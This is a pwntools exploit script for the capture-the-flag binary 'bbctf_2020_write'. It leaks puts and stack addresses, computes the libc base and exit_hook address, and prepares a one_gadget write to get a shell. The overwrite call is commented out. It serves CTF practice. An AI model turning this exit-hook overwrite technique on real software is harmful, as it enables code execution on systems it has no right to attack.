#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/29 18:09:47
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
file_name = "./bbctf_2020_write"
menu = "(q)uit\n"
if context.arch == "amd64":
    libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
    one_offset = [0x4f3d5,0x4f432,0x10a41c]
    # libc_path = "../../libc/libc-2.27.so"
    # one_offset = [0x4f2c5,0x4f322,0x10a38c]
else:
    libc_path = "~/Desktop/pwn/libc/libc-2.27-32.so"
    # libc_path = "/lib/i386-linux-gnu/libc.so.6"
libc = ELF(libc_path)
if debug:
    if context.arch == "amd64":
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
    else:
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
else:
    IP = "node4.buuoj.cn"
    port = 28205
    sh = remote(IP,port)
def debug():
    gdb.attach(sh)
    pause()

def cmd(choice):
    sh.recvuntil(menu)
    sh.sendline(str(choice))

def edit(ptr,content):
    cmd("w")
    sh.recvuntil("ptr: ")
    sh.sendline(str(ptr))
    sh.recvuntil("val: ")
    sh.sendline(str(content))

def quit():
    cmd("q")

sh.recvuntil("puts: 0x")
puts_addr = int(sh.recv(12),16)
log.info("puts_addr=>{}".format(hex(puts_addr)))
libc_base = puts_addr - libc.symbols['puts']
sh.recvuntil("stack: 0x")
stack_addr = int(sh.recv(12),16)
log.info("stack_addr=>{}".format(hex(stack_addr)))
exit_hook = libc_base+0x619060+3848
log.info("exit_hook=>{}".format(hex(exit_hook)))
one = libc_base + one_offset[1]
debug()
# edit(exit_hook,one)
quit()

sh.interactive()